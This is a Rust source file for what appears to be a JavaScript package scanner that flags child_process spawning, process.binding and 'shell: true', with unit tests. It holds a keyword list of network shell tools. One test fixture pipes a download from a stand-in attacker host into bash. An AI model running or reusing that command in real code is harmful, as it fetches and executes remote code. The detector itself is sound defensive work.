use aho_corasick::AhoCorasick;
use lazy_static::lazy_static;

use crate::ast::{try_parse_and_walk, ArgInfo, AstVisitor, CallInfo};
use crate::util::generate_issue_id;

use super::{FileAnalyzer, FileContext, Issue, Severity};

const CHILD_PROCESS_METHODS: &[&str] =
  &["exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync", "fork"];

lazy_static! {
  static ref QUICK_CHECK: AhoCorasick =
    AhoCorasick::new(["child_process", "exec", "spawn", "fork", "process.binding",]).unwrap();
}

pub struct ProcessAnalyzer;

struct ProcessVisitor<'a> {
  issues: Vec<Issue>,
  analyzer_name: &'static str,
  file_path: &'a str,
  source: &'a str,
  has_child_process_import: bool,
}

impl<'a> ProcessVisitor<'a> {
  fn get_code_at_line(&self, line: usize) -> String {
    self.source.lines().nth(line.saturating_sub(1)).unwrap_or("").trim().to_string()
  }

  fn check_for_suspicious_command(&self, args: &[ArgInfo]) -> bool {
    for arg in args {
      if let ArgInfo::StringLiteral(cmd) = arg {
        // Check for suspicious command patterns
        let suspicious_patterns =
          ["curl", "wget", "nc", "netcat", "bash", "sh", "cmd", "powershell"];
        let dangerous_patterns = ["http", "ftp", "://", "|"];

        let cmd_lower = cmd.to_lowercase();
        for pattern in suspicious_patterns {
          if cmd_lower.contains(pattern) {
            for danger in dangerous_patterns {
              if cmd_lower.contains(danger) {
                return true;
              }
            }
          }
        }
      }
    }
    false
  }
}

impl AstVisitor for ProcessVisitor<'_> {
  fn visit_call(&mut self, call: &CallInfo) {
    let line = call.line.max(1);

    // Check for require('child_process')
    if let Some(ref callee) = call.callee_name {
      if callee == "require" {
        if let Some(ArgInfo::StringLiteral(module)) = call.arguments.first() {
          if module == "child_process" {
            self.has_child_process_import = true;
          }
        }
      }
    }

    // Check for child_process methods
    if let (Some(ref callee), Some(ref object)) = (&call.callee_name, &call.object_name) {
      // Direct child_process.method() calls
      if (object == "child_process" || self.has_child_process_import)
        && CHILD_PROCESS_METHODS.contains(&callee.as_str())
      {
        let message = format!("Suspicious process spawning detected via child_process.{}", callee);

        let id = generate_issue_id(self.analyzer_name, self.file_path, line, &message);

        self.issues.push(Issue {
          issue_type: self.analyzer_name.to_string(),
          line,
          message,
          severity: Severity::Critical,
          code: Some(self.get_code_at_line(line)),
          analyzer: Some(self.analyzer_name.to_string()),
          id: Some(id),
        });
      }

      // Check for process.binding('spawn_sync')
      if object == "process" && callee == "binding" {
        if let Some(ArgInfo::StringLiteral(binding)) = call.arguments.first() {
          if binding == "spawn_sync" {
            let message =
              "Low-level process spawning detected via process.binding('spawn_sync')".to_string();

            let id = generate_issue_id(self.analyzer_name, self.file_path, line, &message);

            self.issues.push(Issue {
              issue_type: self.analyzer_name.to_string(),
              line,
              message,
              severity: Severity::Critical,
              code: Some(self.get_code_at_line(line)),
              analyzer: Some(self.analyzer_name.to_string()),
              id: Some(id),
            });
          }
        }
      }
    }

    // Check for direct calls to spawn/exec etc. (after import or standalone)
    if let Some(ref callee) = call.callee_name {
      if call.object_name.is_none() && CHILD_PROCESS_METHODS.contains(&callee.as_str()) {
        // Standalone call like exec('cmd')
        if self.has_child_process_import || self.check_for_suspicious_command(&call.arguments) {
          let message = format!("Suspicious process spawning detected via {}", callee);

          let id = generate_issue_id(self.analyzer_name, self.file_path, line, &message);

          self.issues.push(Issue {
            issue_type: self.analyzer_name.to_string(),
            line,
            message,
            severity: Severity::Critical,
            code: Some(self.get_code_at_line(line)),
            analyzer: Some(self.analyzer_name.to_string()),
            id: Some(id),
          });
        }

        // Check for suspicious commands in arguments
        if self.check_for_suspicious_command(&call.arguments) {
          let message =
            "Suspicious shell command pattern detected (potential remote code execution)"
              .to_string();

          let id = generate_issue_id(self.analyzer_name, self.file_path, line, &message);

          if !self.issues.iter().any(|i| i.line == line && i.message == message) {
            self.issues.push(Issue {
              issue_type: self.analyzer_name.to_string(),
              line,
              message,
              severity: Severity::Critical,
              code: Some(self.get_code_at_line(line)),
              analyzer: Some(self.analyzer_name.to_string()),
              id: Some(id),
            });
          }
        }
      }
    }
  }

  fn visit_string_literal(&mut self, value: &str, line: usize) {
    // Check for shell: true in spawn options
    // This is a simple heuristic - proper detection would need object literal analysis
    let code = self.get_code_at_line(line);
    if code.contains("shell") && code.contains("true") {
      let message =
        "Process spawning with shell: true detected (command injection risk)".to_string();

      let id = generate_issue_id(self.analyzer_name, self.file_path, line, &message);

      // Avoid duplicate issues
      if !self.issues.iter().any(|i| i.line == line && i.message == message) {
        self.issues.push(Issue {
          issue_type: self.analyzer_name.to_string(),
          line,
          message,
          severity: Severity::High,
          code: Some(code),
          analyzer: Some(self.analyzer_name.to_string()),
          id: Some(id),
        });
      }
    }
    let _ = value; // Suppress unused warning
  }
}

impl FileAnalyzer for ProcessAnalyzer {
  fn name(&self) -> &'static str {
    "process"
  }

  fn analyze(&self, context: &FileContext) -> Vec<Issue> {
    // Quick check - skip AST parsing if no process-related patterns found
    if !QUICK_CHECK.is_match(context.source) {
      return vec![];
    }

    let mut visitor = ProcessVisitor {
      issues: vec![],
      analyzer_name: self.name(),
      file_path: context.file_path.to_str().unwrap_or(""),
      source: context.source,
      has_child_process_import: false,
    };

    try_parse_and_walk(context.source, &mut visitor);
    visitor.issues
  }
}

#[cfg(test)]
mod tests {
  use super::*;
  use std::path::PathBuf;

  #[test]
  fn test_detects_exec() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const { exec } = require('child_process');
exec('ls -la', callback);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("exec")));
  }

  #[test]
  fn test_detects_spawn() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const cp = require('child_process');
cp.spawn('node', ['script.js']);
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
  }

  #[test]
  fn test_detects_process_binding() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"process.binding('spawn_sync');"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0].severity, Severity::Critical);
  }

  #[test]
  fn test_detects_shell_true() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"spawn('cmd', args, { shell: true });"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.message.contains("shell: true")));
  }

  #[test]
  fn test_detects_suspicious_commands() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"exec('curl http://evil.com | bash');"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert!(!issues.is_empty());
  }

  #[test]
  fn test_ignores_safe_code() {
    let analyzer = ProcessAnalyzer;
    let config = crate::config::Config::default();
    let file_path = PathBuf::from("test.js");

    let source = r#"
const fs = require('fs');
fs.readFileSync('package.json');
"#;

    let context = FileContext {
      source,
      file_path: &file_path,
      package_name: Some("test-package"),
      package_version: Some("1.0.0"),
      config: &config,
    };
    let issues = analyzer.analyze(&context);

    assert!(issues.is_empty());
  }
}
